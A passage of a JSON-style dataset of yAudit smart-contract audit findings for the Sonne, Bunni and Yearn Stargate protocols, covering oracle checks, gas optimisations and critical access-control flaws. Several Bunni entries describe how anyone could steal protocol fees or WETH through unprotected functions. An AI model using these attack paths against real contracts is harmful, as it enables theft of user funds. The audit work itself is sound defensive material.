to check the roundId and timestamp values that the oracle returns, as shown in other security report findings here and here.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "11. User can accidentally postpone staking release time", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "If burn() is called with amount zero, no state variable changes should be made. Moving all state variable changes inside the if statement will make sure that less gas is spent on the zero amount case, and will also prevent a user from accidentally postponing their release time. function burn(uint256 amount) public { if (amount > 0) { _burn(msg.sender, amount); Withdrawal storage withdrawal_ = withdrawal[msg.sender]; withdrawal_.amount = withdrawal_.amount + amount; withdrawal_.releaseTime = block.timestamp + withdrawalPendingTime; } }", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "12. Small SONNE/USDC liquidity leaves potential for large price shifts", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Let us examine a specific example of the price change before and after this tx involving the EOA that performs swaps of the Sonne staking rewards. Approximately $14500 of USDC was swapped for SONNE. Check the price of SONNE in the pool before the swap (block 94817489) cast call 0xc899c4d73ed8df2ead1543ab915888b0bf7d57a2 \"getAmountOut(uint256,address)(uint256)\" \"10000000000000000000\" \"0x1DB2466d9F5e10D7090E7152B68d62703a2245F0\" --block 94817489 --rpc-url OPTIMISM_RPC 1 SONNE = 1516372 USDC Check the price of SONNE in the pool after the swap (block 94817490) cast call 0xc899c4d73ed8df2ead1543ab915888b0bf7d57a2 \"getAmountOut(uint256,address)(uint256)\" \"10000000000000000000\" \"0x1DB2466d9F5e10D7090E7152B68d62703a2245F0\" --block 94817490 --rpc-url OPTIMISM_RPC 1 SONNE = 1561887 USD Calculate the price change from this swap (1561887 - 1516372) / 1561887 ~ 3% This price impact is even displayed in the Velodrome UI when it exceeds a certain threshold.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "13. Incorrect totalSupply in Comp for on-chain voting", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Excluding the 18 decimals of the SONNE token, 100 million SONNE are minted when the token is deployed. Contrast this to only 10 million COMP total supply value. The values can be queried with etherscan: COMP totalSupply: https://etherscan.io/token/0xc00e94cb662c3520282e6f5717214004a7f26888#readContract#F14 SONNE totalSupply: https://optimistic.etherscan.io/address/0x1DB2466d9F5e10D7090E7152B68d62703a2245F0#readContract#F6 The 10 million total supply value is hardcoded in Comp.sol and was not updated to the 100 million value that should be used in Sonne. This means that on-chain voting could be problematic if Sonne uses Comp.sol for this reason. The Sonne.sol contract clearly shows a total supply of 100 million Sonne.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "14. SUSD and LUSD Chainlink price feeds are not standardized verified feeds", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "The lowest risk and highest quality tier for Chainlink oracles are verified feeds. Monitored Chainlink feeds are the second highest quality tier of oracles, but they carry additional risk and are still under review. Because a common weakness for Compound forks is oracle manipulation leading to the draining of many markets, the Sonne protocol is only as robust as its weakest oracle. Using Chainlink oracles that introduce extra risk is problematic. Screenshots of the Chainlink documentation at the time of the review is below. Chainlink documentation about data feed quality The LUSD data feed is a monitored feed The SUSD data feed is a monitored feed", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "15. Functions calls to uninitialized address", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Because the address is not initialized, the attacker could deploy a harmful contract with the same function calls but with harmful logic. Also, function calls should be done using a contract interface.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "16. High default slippage may lose value", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "The velodrome frontend has an unusually high 2% slippage setting. The slippage in AMMs like Uniswap is automatically set in a dynamic way. Based on conversations with the development team, the default slippage has been used in the past. While Optimism is not at risk of MEV right now, a high slippage tolerance can still lose value if the token weights in the Velodrome pool do not favor the direction of the swap.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "17. Remove SafeMath import", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Solidity 0.8.0 introduced a breaking change to implement overflow and underflow protection. The original code from Tarot Finance was using solidity 0.6.6 which did not have this feature. This means the SafeMath imports can be removed to save gas on deployment for Distributor.sol.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "18. Cache variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Obtaining the length of an array consumes gas, so storing this value in a temporary memory variable when the value is needed more than once saves gas, like in claimAll().", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "19. Replace totalShares and shares[]", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Etherscan shows that the totalShares and totalSupply values for uSONNE and sSONNE are the same. Reasoning about the totalShares math in _editRecipientInternal() reaches the conclusion that these values should remain the same. _editRecipientInternal() increases totalShares when uSONNE or sSONNE is minted, decreases totalShares when uSONNE or sSONNE is burned, and doesn't modify totalShares when uSONNE or sSONNE is transferred between non-zero addresses. The same applies to shares[]. In fact, because _editRecipientInternal() is always called with shares_ set to balanceOf(account), the shares[] mapping is duplicating exactly what _balances[] already stores. The only reason that Tarot Finance has a totalShares state variable and stores the shares count in recipient.shares (the equivalent of shares[]) in its Distributor contract (the inspiration for Sonne's Distributor) is because the Tarot Finance contract is not an ERC20 and does not have a totalSupply variable or _balances mapping.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "20. Remove duplicate line of code", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "This line of claimInternal() can be removed because updateCredit() performs the same check and updateCredit() is called in the 2nd line of claimInternal().", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "21. Consistently apply unchecked for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "This line of sub() and this line of div() can be unchecked. This would follow the approach applied in trySub() and tryDiv() in the OZ SafeMath library for solidity 0.8.X and the approach in add() and mul() of the Sonne SafeMath library.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "22. Use Solidity errors in 0.8.4+", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Require statements are found throughout the protocol, but especially in Comptroller.sol, CToken.sol, and ExternalRewardDistributor.sol. Replacing require with solidity errors can provide gas savings.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "23. Borrow gas optimizations from Compound", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "notifyBorrowIndexInternal() and notifyBorrowIndexInternal() can benefit from gas optimizations by: caching state variable storage values retrieved more than once removing duplicate > or < checks The specific differences compared to Compound are: notifyBorrowIndexInternal() checks if blockNumber > marketState.borrowBlock and then performs the math blockNumber - marketState.borrowBlock with SafeMath. The subtraction can be unchecked to save gas, or the logic from Compound where the subtraction is performed before the if statement can be used. Two state variable values are queried twice, marketState.supplyBlock and marketState.supplySpeed. These values can be cached to save gas in the case where they are queried twice. Compound only caches supplySpeed because the supply block is queried only once because of the previous optimization (subtracting the values before the if statement).", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "24. Initialize variable only if needed", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Variable marketBorrowIndex is initialized before the if statement but its only used inside the second if block.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "25. Undocumented market creation process", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "One of the top causes of Compound fork hacks is reentrancy bugs, because Compound does not follow the checks-effects-interaction pattern. This means that if a Sonne market is created with a token that allows reentrancy, such as an ERC777 token, this can put the protocol funds at risk. Compound has a clear process for adding new markets that includes creating a public governance proposal. Compound is aware of this risk but has chosen not to fix it in their code.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "26. Replace magic numbers with constants", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Distribution.sol uses magic number 2**160 in several places. Consider replacing these magic numbers with a constant internal variable. This will not change gas consumption.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "27. Remove unused code", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Distribution.sol has commented code that is not used, L105 and L116. Removing it will improve readability.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "28. Add events to Distributor.sol", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Add events for changing the list of rewards tokens tokens. One for each of the functions addToken() and removeToken() in the file Distribution.sol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "29. Add event to setWithdrawalPendingTime() and burn()", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "It can be helpful to add events for any action that modifies state variables to make it easier to trace when the value change happened and to add monitoring of such changes more easily.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "30. Remove unused files", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Removing unused files will improve readability.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "31. Outsourcing staking yield generation increases risk", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Sonne heavily relies on Velodrome for the Sonne staking protocol. Unlike some other staking protocols, Sonne does not directly provide rewards to stakers but instead outsources the reward generation to Velodrome. Relying on a protocol that does not have an active bug bounty program, has not gotten an audit from a high quality firm, is forked from Solidly which had several known bugs, and has a top 30 TVL introduces risk to the funds that Sonne users stake. Because Velodrome is likely one of the highest TVL protocols without an active bug bounty program, they likely are a target for bad actors while they do not have much incentive for white hat hackers to look at their code.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "32. Use consistent naming for internal functions", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "_editRecipientInternal() and claimInternal() are defined in Distributor.sol. Consider renaming claimInternal() to _claimInternal() for consistency to avoid confusion about the context of certain functions.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "33. Remove redundant import", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Distributor.sol imports SafeToken.sol and StakedDistributor.sol also imports SafeToken.sol. The SafeToken.sol import in StakedDistributor.sol can be removed because StakedDistributor.sol already imports Distributor.sol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "34. Missing NatSpec", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "NatSpec is a good way to explain your code to other developers modifying or forking a project, to users who want to understand what the contracts are doing, and to auditors who are trying to determine whether the contract logic is implemented properly. The contracts of staking-protocol have a severe lack of detailed NatSpec comments which makes it harder to understand the developer's intentions.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "35. Simplify claimInternal() arguments", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "claimInternal() takes two function arguments of type address. But this function is an internal function, and the only two places where it is called (1, 2) set the account argument to msg.sender. This means claimInternal() does not require this argument because account can be replaced with msg.sender.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "36. Document the end of rewards accumulation when burn() is called", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Every SONNE depositor into uSONNE or sSONNE must leave their tokens in the contract for one week without reward accumulation. This is not documented in the Sonne staking docs, but should be. Otherwise if the documentation does not properly describe this behavior, users may not expect the code to be implemented in the way that it is.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "37. Distributor function removeToken() can lose funds", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Removing reward token from the list of reward tokens will result in locked reward tokens which cannot be collected by users or contract owner.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "38. Unnecessary code from Compound", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Compound proposal 65 is related to fixing a past issue that Compound had related to distributing rewards early. Sonne does not need to fix such an issue and therefore this function is unnecessary outside of Compound. liquidateBorrowVerify() is also unnecessary. Remove the functions without purpose or implement if needed: sizeVerify(), transferVerify(), mintVerify(), borrowVerify(), repayBorrowVerify(), liquidateBorrowVerify(). Also, remove errors that are not used: TransferTooMuch and LiquidateRepayBorrowFreshFailed.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "39. Make public functions external", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Declare these public functions as external because they do not need to be called internally: getSupplyRate() in JumpRateModelV4.sol isOwner() in Ownable.sol", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "40. Use standard implementation approach in SafeMath.sol", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "There are two functions for each SafeMath operation. One of the functions supports an arbitrary error message by providing a function argument for this message. The other function has a hardcoded error message. The way that sub() and div() are implemented is by having the hardcoded error message implementation calling the arbitrary error message implementation with a hardcoded error string. But add() and mul() are not implemented in this way. Instead, add() and mul() reimplement the function with the arbitrary error message but replace the function argument with a hardcoded string. Consider using the same approach from sub() and div() in add() and mul() to avoid reimplementing the same logic.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "41. Incorrect price oracle address in Sonne docs", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Sonne docs show the price oracle address is 0xEFc0495DA3E48c5A55F73706b249FD49d711A502. But the Comptroller oracle state variable has the value of 0x8d0db2bd9111e35554b8152e172451c80dff22b7. The older Sonne price oracle does not contain data for tokens soWBTC, soLUSD, and sowstETH.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "42. No comparison against minAnswer or maxAnswer", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "The Chainlink data is verified to be greater than zero, but a stricter check would use the aggregator minAnswer and maxAnswer values. Chainlink documents this approach in their docs. Many tokens, like USDC or USDT, have a minAnswer value equivalent of $0.01.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "43. _getLatestPrice() timeStamp return value never used", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "_getLatestPrice() is an internal function with two return values, uPrice and timeStamp. timeStamp is not used when this internal function is called so it can be removed.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "44. Protocol will stop working after year 2106", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "getBlockNumber() is safecast to uint32 in Comptroller.sol (1, 2) and will revert in the year 2016 when block.timestamp is too large for this type.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "45. Typos", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "compAccued() in BasicLens should be compAccrued(). Also consider modifying the function and variable names that include the word block because the Sonne implementation of all of these functions and variables uses seconds, not blocks. getBlockNumber() -> getBlockTimestamp() blocksPerYear -> secondsPerYear multiplierPerBlock -> multiplierPerSecond jumpMultiplierPerBlock -> jumpMultiplierPerSecond baseRatePerBlock -> baseRatePerSecond", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "46. Use interface instead of call function", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Calling the contract using an interface is more secure than using call function. File ExternalRewardDistributor.sol contains the interface for ExternalRewardDistributor contract. Change call function defined at L1458, L1590, L1639, L1700 and L1792.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "47. SNX token risk", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "SNX had a double entrypoint issue that was found in Balancer. The issue was originally reported for mainnet but the same bug was applicable on Optimism. Even after this fix, the mainnet SNX code and the Optimism SNX code are different. The SNX token on mainnet and Optimism is using a form of proxy, and the implementation on Optimism has assembly code that differs from the OpenZeppelin implementation. The code of this token is out of scope of the Sonne audit, but risks to Sonne can be introduced by supporting markets for tokens that have added risks.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "48. Solidity version 0.8.20", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "New opcode PUSH0 is introduced in Solidity version 0.8.20 which may not be supported on a chain other than mainnet like L2 chains.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Anyone can call uniswapV3MintCallback() stealing the protocol fees", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "LiquidityManagement::uniswapV3MintCallback() only checks that msg.sender == address(decodedData.pool), which any attacker can trivially fulfill by setting decodedData.pool to an address they own. The function then transfers decodedData.pool.token0() and decodedData.pool.token1() to msg.sender, the amount of which is specified by the caller.", "labels": ["yAudit", "Severity: Critical", "Difficulty: n/a"]}, {"title": "2. Anyone can call the PeripheryPayments sweepToken() stealing the protocol fees", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "PeripheryPayments is a dependency of the LiquidityManagement contract, which is a dependency of the BunniHub contract. PeripheryPayments has a sweepToken() with no access control which allows a caller to transfer any token from the BunniHub contract to any recipient.", "labels": ["yAudit", "Severity: Critical", "Difficulty: n/a"]}, {"title": "3. Anyone can call the PeripheryPayments unwrapWETH9() stealing the weth stored in BunniHub", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "PeripheryPayments is a dependency of the LiquidityManagement contract, which is a dependency of the BunniHub contract. PeripheryPayments has a unwrapWETH9() with no access control which allows a caller to the contract's weth balance from the BunniHub contract to any recipient.", "labels": ["yAudit", "Severity: Critical", "Difficulty: n/a"]}, {"title": "4. General complexity around ETH management including certain circumstances where ETH could be lost", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "The BunniHub contract currently only has one payable function that can receive ETH which is the receive() found in PeripheryPayments. That function requires that the sender is WETH9. In general BunniHub will not be interacting with ETH but there is functionality embedded with the Uniswap imports related to the management of ETH which adds complexity and some risk. abstract contract PeripheryPayments is IPeripheryPayments, PeripheryImmutableState { receive() external payable { require(msg.sender == WETH9, 'Not WETH9'); } If for some reason someone unwrapped WETH and set the recipient to the BunniHub, then the contract would no hold the ETH. This ETH could be taken by anyone via refundEth() or it could also be included used the next time anyone deposited into a WETH pool since pay() includes some logic that is designed to work with with unwrapping WETH: function pay( address token, address payer, address recipient, uint256 value ) internal { if (token == WETH9 && address(this).balance >= value) { // pay with WETH9 IWETH9(WETH9).deposit{value: value}(); // wrap only what is needed to pay IWETH9(WETH9).transfer(recipient, value); } else if (payer == address(this)) { ...", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "5. Calling withdraw() forfeits uncollected LP fees", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "Fees are collected and reinvested via compound(), but when withdraw() is called, fees are not collected.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "6. Optimize the sweepTokens() loop", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "@@ -436,12 +453,16 @@ contract BunniHub is - for (uint256 i = 0; i < tokenList.length; i++) { + uint256 tokenListLength = tokenList.length; + for (uint256 i = 0; i < tokenListLength;) { SafeTransferLib.safeTransfer( tokenList[i], recipient, tokenList[i].balanceOf(address(this)) ); + unchecked { + ++i; + } } Incrementing i can be done in an unchecked block because the number of tokens will not overflow saving 108 gas per per iteration. The length of an array can be stored outside of the for loop for additional gas savings 3 gas per iteration.of as is suggested here. Incrementing with ++i instead of i++ saves ~5 gas per iteration from reduced stack operations.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "7. Upgrade to at least solidity 0.8.4", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "Currently there is no underflow or overflow protection at the compiler level in Bunni, which means SafeMath style libraries are necessary, which are gas inefficient compared to the compiler and potentially less safe. Also see hrkrshnn's related comment.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "8. Use latest versions of unmodified libraries", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "The contracts are using Solidity 0.7.6 some library contracts (CREATE3, ERC20, and SafeTransferLib) were copied into the directory rather than being imported. However, due to these being copied into the project and also because of some modifications, they do not match the latest versions of these projects.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "9. Consider Foundry scripting for the deployment scripts", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "Currently bash scripts are used for the deployment scripts. While they are currently relatively simple, as the project progresses this may no longer be the case.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "10. Typo in README", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "There is a typo in the README \"perfer\".", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "11. Consider adding npm related steps to the README", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "npm is used to manage dependencies but this information is not present in the README.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "12. Consider removing the WETH unwrapping logic", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md", "body": "One of the critical findings is related to WETH management. If it's not necessary it is a source of unecessary additional complexity that may lead to other future vulnerabilities.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Discrepancy in BaseStrategy versioning", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The git blame of BaseFeeOracle.sol from the yearn-vaults repo shows that the entire file is a new addition for yearn-vaults release v0.4.5. The file diff for PR #546 confirms the introduction of baseFee values in the v0.4.5 release.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "2. estimatedTotalAssets() does not include value of reward tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The function name estimatedTotalAssets() implies all value held by the strategy is accounted for. The rewards from the staking pool are not, however, included in this calculation. This means after _claimRewards() is called in prepareReturn(), the value of _profit doesn't include the rewards just claimed. The _profit only includes these rewards after ySwap or Cowswap swaps the reward to want, which causes a delay in perceived profits. It may be intentional to only include the value of want and LP tokens in this calculation. Because this is a public function, other users or protocols may assume the function does account for all forms of value held by the strategy, which is an incorrect assumption. Instead, after rewards are claimed by the strategy and are converted into want tokens, the total assets of this strategy will suddenly increase. The amount of this sudden increase could vary depending on how often the rewards are redeemed from the staking pool and how often they are swapped for want. Beyond the inclusion of rewards in the profit and asset values, without guarantees around when the ySwap process will happen, it is possible that the strategy may hold the reward tokens in the form of STG or eTokens for some time. This would delay the start of compound interest on those rewards. Clearer guarantees or incentives to minimize the time between harvest() and the ySwap would resolve this.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "3. Loss calculation discrepancies", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The loss calculation in prepareReturn() is calculated with several assumptions. We will examine each step of the calculations and the relevant assumptions. The first loss calculation is in withdrawSome(). The loss will be zero if _potentialLoss < balanceOfLPTokens. This calculation assumes the LP tokens have the value that the Stargate pool advertises, which is a multiple of the underlying want asset (with bridge fees slowly adding to this value). But relying on the Pool to provide the value of an LP token assumes that the Pool is working normally and all LP tokens can be withdrawn. If the LP tokens cannot be withdraw, they will have zero value and cannot be assumed to compensate for any potential loss. The delta credit calculation is a complex algorithm, so it should be evaluated whether this complexity may introduce risk. The loss calculation may be problematic for liquidatePosition(), where the BaseStrategy describes the return values with the comment This function should return the amount of want tokens made available by the liquidation. If there is a difference between them, _loss indicates whether the difference is due to a realized loss, or if there is some other sitution at play (e.g. locked funds) where the amount made available is less than what is needed. Because withdrawSome() returns a loss of 0 even when there are locked funds, it may not meet with the described goal of the loss return value in liquidatePosition() if locked funds are considered losses (either because of temporary delta credit limits or because of a hack). The second loss calculation is in prepareReturn(). The calculation depends on whether _vaultDebt > _totalAssets is true. The problem with this is that a separate finding explains how estimatedTotalAssets() does not include the value of reward tokens, and _totalAssets = estimatedTotalAssets() in this calculation. If there is substantial value stored in reward tokens, the value of _totalAssets would be lower than the value of assets held by the strategy, meaning the loss value may be calculated as a larger loss than in reality once the reward tokens are factored in. The third loss calculation is at the end of prepareReturn(). This calculation compares loss to profit, but like the previous step of loss calculations, profit is dependent on estimatedTotalAssets(), so the profit may be less than in actuality. If _loss > _profit, then the reduction in loss may partially cancel out the inflation of the loss from the previous step, but if _loss <= _profit, then loss would not receive this adjustment.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "4. Variables set to Ethereum addresses", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The strategy is planned to use on other chains, like Optimism. These variables should be defined per chain.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "5. Emergency unstake forgoes extra rewards even when they can be claimed", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "_emergencyUnstakeLP is an internal function executed during migration, or during admin-initiated emergency exits. In the former case, migration can be required even if the staker contract is still functional and is receiving rewards. In the latter case, admin can call emergency unstake by mistake when the rewards are still claimable. In both cases, pending rewards will be discarded and irrecoverably stuck in the Stargate LP staker contract.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "6. Duplicate line of code", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "In prepareReturn(), the forceHarvestTriggerOnce variable gets set to false. However, the BaseStrategy does the exact same thing right after the call to prepareReturn() is completed, even with the same comment. This line of code (and the comment) is redundant.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "7. Use BaseStrategy logic for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The BaseStrategy saves an if statement in harvestTrigger() by returning the final boolean directly. The current strategy implementation is not as direct.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "8. Use Solidity errors in 0.8.4+", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Require statements are used in the strategy and error messages are not used anywhere. Using this new solidity feature can provide gas savings on revert conditions.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "9. Use simple comparison", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The prepareReturn() function contains this code: if (_liquidWant <= _profit) { _profit = _liquidWant; _debtPayment = 0; // enough to pay for all profit and _debtOutstanding (partial or full) } else { _debtPayment = Math.min(_liquidWant - _profit, _debtOutstanding); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (_liquidWant > _profit) { _debtPayment = Math.min(_liquidWant - _profit, _debtOutstanding); } else { _profit = _liquidWant; _debtPayment = 0; // enough to pay for all profit and _debtOutstanding (partial or full) }", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "10. Use unchecked if no underflow risk", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The first location where unchecked can be applied - _profit = _totalAssets > _vaultDebt ? _totalAssets - _vaultDebt : 0; + unchecked { _profit = _totalAssets > _vaultDebt ? _totalAssets - _vaultDebt : 0; } The second location where unchecked can be applied - (_amountFreed, _loss) = withdrawSome( - _toLiquidate - _wantBalance - ); + unchecked { (_amountFreed, _loss) = withdrawSome( + _toLiquidate - _wantBalance + ); } Similar savings can be found throughout the contract because many logic checks remain from a recent commit where the strategy was migrated from an older version of solidity that did not have built-in SafeMath to a newer version that does have SafeMath. Other examples are found here, here, here, here, here, here, here, here, here, and here.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "11. Remove unneeded variables", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "_amountFreed is set in prepareReturn() but is never used after that point. The variable and the lines setting it can be deleted to save gas. In withdrawSome(), _liquidatedAmount is used only to return the proper value, and in on branch of the if statement _liquidatedAmount is set to _liquidAssets. Instead of creating a new temporary variable _liquidAssets, use _liquidatedAmount instead and change the if statement logic to - uint256 _liquidAssets = balanceOfWant() - _preWithdrawWant; + _liquidatedAmount = balanceOfWant() - _preWithdrawWant; - if (_amountNeeded > _liquidAssets) { + if (_amountNeeded > _liquidatedAmount) { - _liquidatedAmount = _liquidAssets; uint256 balanceOfLPTokens = _lpToLd(balanceOfAllLPToken()); - uint256 _potentialLoss = _amountNeeded - _liquidAssets; + uint256 _potentialLoss = _amountNeeded - _liquidatedAmount; _loss = _potentialLoss > balanceOfLPTokens ? _potentialLoss - balanceOfLPTokens:0; } else { _liquidatedAmount = _amountNeeded; } At L218 there is no need define _liquidWant and call balanceOfWant(). Recalculate _ wantBalance after L213. Remove variable _liquidWant and use _wantBalance instead.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "12. Remove unneeded if statement", "html_url": 